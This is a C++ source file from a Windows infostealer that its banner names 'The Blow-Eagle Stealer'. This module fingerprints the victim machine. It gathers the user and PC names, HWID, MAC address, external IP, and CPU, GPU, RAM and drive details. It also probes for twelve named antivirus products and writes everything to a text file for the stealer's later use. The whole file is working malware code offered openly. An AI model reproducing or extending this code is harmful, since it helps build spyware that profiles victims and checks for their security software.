/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"


#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <fstream>
#include <string.h>
#include <string>
#include <ctime>
#include <sstream>
#include <iphlpapi.h>
#include <curl\curl.h>
#include <tchar.h>
#include <intrin.h>
#include <dxgi.h>
#include <pdh.h>
#pragma comment(lib, "pdh.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "wbemuuid.lib")
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#include <filesystem>

namespace fs = std::filesystem;


namespace global 
{
	std::string info = "";

	std::string logo = R"LOGO(|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗  |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝  |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░  |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░  |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗  |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝  |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|)LOGO";
}

/// <summary>
/// get User, Pc name, OS, Hwid , Mac, Time, IPs
/// </summary>
void GetGeneralInfo();

void CPU();

void GPU();

void RAM();

void Drives();

void Antivirus();

std::string GetCPUType();

std::string GetWindowsOSType();

void cursystem::GetSysInfo()
{
	printf("sys info\n");

	std::string mainPath = "C:/Users/" + func::GetUser() + config::path + "/System-Info/System-Info.txt";

	GetGeneralInfo();
	CPU();
	GPU();
	RAM();
	Drives();
	Antivirus();


	std::ofstream file(mainPath, std::ios::app);
	if (file.is_open())
	{
		file << global::logo << std::endl;
		file << global::info;
	}

	file.close();
}


void GetGeneralInfo() 
{
	std::time_t currentTime = std::time(nullptr);

	// Convert the current time to a string
	std::string timeString = std::ctime(&currentTime);

	// Remove the newline character at the end of the string
	timeString.erase(timeString.find_last_not_of("\n") + 1);

	global::info += "Time and Date: " + timeString + '\n';

	global::info += "User name: " + func::GetUser() + '\n';

	TCHAR str[UNLEN + 1];
	DWORD sizethis1 = UNLEN + 1;
	GetComputerName((TCHAR*)str, &sizethis1);
	std::wstring ws1(str);
	std::string pcName(ws1.begin(), ws1.end());

	global::info += "PC name: " + pcName + '\n';


	global::info += "OS: " + GetWindowsOSType() + '\n';


    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    std::wstring wstr(hwProfileInfo.szHwProfileGuid);
    std::string HWID(wstr.begin(), wstr.end());
    size_t end = std::size(HWID);
    HWID = HWID.substr(1, end - 2);

    global::info += "Hwid: " + HWID + '\n';

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufferSize = sizeof(adapterInfo);

	DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
	if (result == ERROR_BUFFER_OVERFLOW) {
		std::cerr << "Insufficient buffer size" << std::endl;
	}
	else if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to get adapter information" << std::endl;
	}

	PIP_ADAPTER_INFO adapter = adapterInfo;
	std::stringstream macAddress;

	for (; adapter != nullptr; adapter = adapter->Next) {
		if (adapter->AddressLength != 6) {
			continue;  // Skip non-physical adapters
		}
		macAddress << ":";
		for (DWORD i = 0; i < adapter->AddressLength; ++i) {
			if (i > 0) {
				macAddress << ":";
			}

			macAddress << std::hex << static_cast<int>(adapter->Address[i]);
		}
		macAddress << ":";
		break;
	}

	//std::cout << "MAC Address: " << macAddress.str() << std::endl;

	std::string mac = "";

	for (size_t i = 0; i < std::size(macAddress.str()); i++)
	{
		if (isdigit(macAddress.str()[i]) && macAddress.str()[i - 1] == ':' && macAddress.str()[i + 1] == ':')
		{
			mac += '0';
		}
		mac += macAddress.str()[i];
	}

	mac = mac.substr(1, std::size(mac) - 2);

	global::info += "MAC Address: " + mac + '\n';

	std::string ipAddress = func::GetIP();

	global::info += "External IP Address: " + ipAddress + '\n';


}

std::string GetWindowsOSType() {

	float ret = 0.0f;
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;
	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
		ret = osInfo.dwMajorVersion;
	}
	return "Windows " + std::to_string(ret);

}

void CPU()
{
	// Get the CPU type
	std::string cpuType = GetCPUType();

	//std:: cout << "\n\nCPU Type: " + cpuType + '\n';
	global::info += "\n\nCPU Type: " + cpuType + '\n';

	// Get the number of CPU cores
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	DWORD numCores = sysInfo.dwNumberOfProcessors;
	global::info += "Number of CPU Cores: " + std::to_string(numCores) + '\n';
	//std::cout << "Number of CPU Cores: " << std::to_string(numCores) << '\n';

	// Get the maximum CPU frequency
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		DWORD freqValue;
		DWORD freqSize = sizeof(freqValue);
		if (RegQueryValueEx(hKey, _T("~MHz"), NULL, NULL, reinterpret_cast<LPBYTE>(&freqValue), &freqSize) == ERROR_SUCCESS) {
			global::info += "Maximum CPU Frequency: " + std::to_string(freqValue) + " MHz\n";
		}

		RegCloseKey(hKey);
	}

}


std::string GetCPUType() 
{

	std::string cpuType;

    int cpuInfo[4] = { -1 };
    char cpuBrandString[0x40] = { 0 };

    // Check if the CPUID instruction is supported
    __cpuid(cpuInfo, 0x80000000);
    unsigned int nExIds = cpuInfo[0];

    // Get the CPU brand string
    for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);

        if (i == 0x80000002)
            memcpy(cpuBrandString, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(cpuBrandString + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(cpuBrandString + 32, cpuInfo, sizeof(cpuInfo));
    }

    cpuType = cpuBrandString;

    return cpuType;

}

void GPU() 
{
	global::info += "\n\n";

	IDXGIFactory* pFactory = nullptr;
	if (FAILED(CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory))) {
		std::cerr << "Failed to create DXGI Factory" << std::endl;
		return;
	}

	IDXGIAdapter* pAdapter = nullptr;
	UINT adapterIndex = 0;
	while (pFactory->EnumAdapters(adapterIndex, &pAdapter) != DXGI_ERROR_NOT_FOUND) {
		DXGI_ADAPTER_DESC adapterDesc;
		if (SUCCEEDED(pAdapter->GetDesc(&adapterDesc))) {
			global::info += "GPU " + std::to_string(adapterIndex + 1) + ":" + '\n';
			std::wstring ws(adapterDesc.Description);
			std::string str(ws.begin(), ws.end());
			global::info +="  Description: " + str + '\n';
			global::info += "  Dedicated Video Memory: " + std::to_string((adapterDesc.DedicatedVideoMemory / (1024 * 1024))) + " MB" + '\n';
			global::info += "  System Video Memory: " + std::to_string((adapterDesc.SharedSystemMemory / (1024 * 1024))) + " MB" + '\n';
			global::info += "  Memory Bus Width: " + std::to_string(adapterDesc.DedicatedVideoMemory / 8 )+ " bits" + '\n';

		}

		pAdapter->Release();
		pAdapter = nullptr;
		adapterIndex++;
	}

	pFactory->Release();
}

void RAM() 
{
	global::info += "\n\n";

	PDH_STATUS pdhStatus;
	HQUERY hQuery = NULL;
	HCOUNTER hCounter = NULL;
	PDH_FMT_COUNTERVALUE counterValue;

	// Step 1: Initialize the PDH library
	pdhStatus = PdhOpenQuery(NULL, 0, &hQuery);
	if (pdhStatus != ERROR_SUCCESS) {
		std::cerr << "Failed to initialize PDH library. Error code: " << pdhStatus << std::endl;
		return;
	}

	// Step 2: Add the performance counter for total physical memory
	pdhStatus = PdhAddCounter(hQuery, TEXT("\\Memory\\Available Bytes"), 0, &hCounter);
	if (pdhStatus != ERROR_SUCCESS) {
		std::cerr << "Failed to add counter for available memory. Error code: " << pdhStatus << std::endl;
		PdhCloseQuery(hQuery);
		return;
	}

	// Step 3: Collect the performance data
	pdhStatus = PdhCollectQueryData(hQuery);
	if (pdhStatus != ERROR_SUCCESS) {
		std::cerr << "Failed to collect query data. Error code: " << pdhStatus << std::endl;
		PdhCloseQuery(hQuery);
		return;
	}

	// Step 4: Retrieve the counter value for available memory
	pdhStatus = PdhGetFormattedCounterValue(hCounter, PDH_FMT_LARGE, NULL, &counterValue);
	if (pdhStatus != ERROR_SUCCESS) {
		std::cerr << "Failed to get counter value. Error code: " << pdhStatus << std::endl;
		PdhCloseQuery(hQuery);
		return;
	}

	// Step 5: Calculate used memory by subtracting available memory from total memory
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORDLONG totalMemory = memoryStatus.ullTotalPhys;
	DWORDLONG usedMemory = totalMemory - counterValue.largeValue;
	DWORDLONG availableMemory = totalMemory - usedMemory;

	// Step 6: Print the memory information
	global::info += "Total RAM: " + std::to_string(totalMemory / (1024 * 1024)) + " MB\n";
	global::info += "Available RAM: " + std::to_string(availableMemory / (1024 * 1024)) + " MB\n";
	global::info += "Used RAM: " + std::to_string(usedMemory / (1024 * 1024)) + " MB\n";


	// Step 7: Cleanup
	PdhCloseQuery(hQuery);

	HRESULT hres;

	// Step 1: Initialize COM
	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres)) {
		std::cerr << "Failed to initialize COM library. Error code: " << hres << std::endl;
		return;
	}

	// Step 2: Obtain the initial locator to WMI
	IWbemLocator* pLoc = NULL;
	hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	if (FAILED(hres)) {
		std::cerr << "Failed to create IWbemLocator object. Error code: " << hres << std::endl;
		CoUninitialize();
		return;
	}

	// Step 3: Connect to WMI through the IWbemLocator::ConnectServer method
	IWbemServices* pSvc = NULL;
	hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
	if (FAILED(hres)) {
		std::cerr << "Failed to connect to WMI. Error code: " << hres << std::endl;
		pLoc->Release();
		CoUninitialize();
		return;
	}

	// Step 4: Set the security levels on the proxy
	hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL,
		RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	if (FAILED(hres)) {
		std::cerr << "Failed to set proxy blanket. Error code: " << hres << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	// Step 5: Use the IWbemServices pointer to make requests of WMI
	IEnumWbemClassObject* pEnumerator = NULL;
	hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM Win32_PhysicalMemory"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
	if (FAILED(hres)) {
		std::cerr << "Failed to execute WQL query. Error code: " << hres << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	// Step 6: Retrieve the data from the query result
	int counter = 1;
	IWbemClassObject* pClassObj = NULL;
	ULONG uReturn = 0;
	while (pEnumerator) {
		hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &uReturn);
		if (uReturn == 0)
			break;

		VARIANT vtProp;
		hres = pClassObj->Get(L"MemoryType", 0, &vtProp, 0, 0);

		global::info += "RAM bar number: " + std::to_string(counter)+ '\n';

		if (SUCCEEDED(hres)) {
			// Memory types: https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-physicalmemory
			std::string memoryType;
			switch (vtProp.uintVal) {
			case 0: memoryType = "Unknown"; break;
			case 1: memoryType = "Other"; break;
			case 2: memoryType = "DRAM"; break;
			case 3: memoryType = "Synchronous DRAM"; break;
			case 4: memoryType = "Cache DRAM"; break;
			case 5: memoryType = "EDO"; break;
			case 6: memoryType = "EDRAM"; break;
			case 7: memoryType = "VRAM"; break;
			case 8: memoryType = "SRAM"; break;
			case 9: memoryType = "RAM"; break;
			case 10: memoryType = "ROM"; break;
			case 11: memoryType = "Flash"; break;
			case 12: memoryType = "EEPROM"; break;
			case 13: memoryType = "FEPROM"; break;
			case 14: memoryType = "EPROM"; break;
			case 15: memoryType = "CDRAM"; break;
			case 16: memoryType = "3DRAM"; break;
			case 17: memoryType = "SDRAM"; break;
			case 18: memoryType = "SGRAM"; break;
			case 19: memoryType = "RDRAM"; break;
			case 20: memoryType = "DDR"; break;
			case 21: memoryType = "DDR2"; break;
			case 22: memoryType = "DDR2 FB-DIMM"; break;
			case 23: memoryType = "Reserved"; break;
			case 24: memoryType = "DDR3"; break;
			case 25: memoryType = "FBD2"; break;
			case 26: memoryType = "DDR4"; break;
			case 27: memoryType = "LPDDR"; break;
			case 28: memoryType = "LPDDR2"; break;
			case 29: memoryType = "LPDDR3"; break;
			case 30: memoryType = "LPDDR4"; break;
			case 31: memoryType = "Logical non-volatile device"; break;
			default: memoryType = "Unknown"; break;
			}

			global::info += "  RAM Type: " + memoryType + '\n';
			VariantClear(&vtProp);
		}

		hres = pClassObj->Get(L"ConfiguredClockSpeed", 0, &vtProp, 0, 0);
		if (SUCCEEDED(hres)) {
			global::info += "  RAM Frequency: " + std::to_string(vtProp.uintVal) + " MHz\n";
			VariantClear(&vtProp);
		}
		counter++;
		pClassObj->Release();
	}

	// Step 7: Cleanup
	pEnumerator->Release();
	pSvc->Release();
	pLoc->Release();
	CoUninitialize();

}

void Drives() 
{
	global::info += "\n\n";

	DWORD logicalDrives = GetLogicalDrives();
	global::info += "Drive Volumes: \n";
	for (char drive = 'A'; drive <= 'Z'; drive++) {
		if (logicalDrives & (1 << (drive - 'A'))) {
			std::string driveRoot = std::string(1, drive) + ":\\";
			global::info += "  Drive: " + driveRoot + '\n';

			// Get file system type
			char fileSystemName[MAX_PATH + 1];
			DWORD fileSystemFlags;
			if (GetVolumeInformationA(driveRoot.c_str(), NULL, 0, NULL, NULL, &fileSystemFlags, fileSystemName, MAX_PATH)) {
				global::info += "  File System Type: " + std::string(fileSystemName) + '\n';
			}

			// Get drive volume information
			ULARGE_INTEGER totalBytes;
			ULARGE_INTEGER freeBytes;
			ULARGE_INTEGER totalFreeBytes;
			if (GetDiskFreeSpaceExA(driveRoot.c_str(), &freeBytes, &totalBytes, &totalFreeBytes)) {
				global::info += "  Total Memory: " + std::to_string((totalBytes.QuadPart / (1024 * 1024))/1000) + " GB\n";
				global::info += "  Used Memory: " + std::to_string(((totalBytes.QuadPart - freeBytes.QuadPart) / (1024 * 1024)) / 1000 )+ " GB\n";
			}

			global::info += "\n";
		}
	}
}

void Antivirus() 
{
	global::info += "\nAntiviruses:\n";

	std::string Antiviruses [] = {
			"C:\\Program Files\\Windows Defender",
			"C:\\Program Files\\AVAST Software\\Avast",
			"C:\\Program Files\\AVG\\Antivirus",
			"C:\\Program Files (x86)\\Avira\\Launcher",
			"C:\\Program Files (x86)\\IObit\\Advanced SystemCare",
			"C:\\Program Files\\Bitdefender Antivirus Free",
			"C:\\Program Files\\DrWeb",
			"C:\\Program Files\\ESET\\ESET Security",
			"C:\\Program Files (x86)\\Kaspersky Lab",
			"C:\\Program Files (x86)\\360\\Total Security",
			"C:\\Program Files\\ESET\\ESET NOD32 Antivirus",
			"C:\\Program Files\\Malwarebytes\\Anti-Malware"
	};

	for (std::string av : Antiviruses) 
	{
		if (fs::exists(av)) 
		{
			int index = av.rfind('\\');

			global::info += "  " + av.substr(index+1, std::size(av));;
		}
	}

}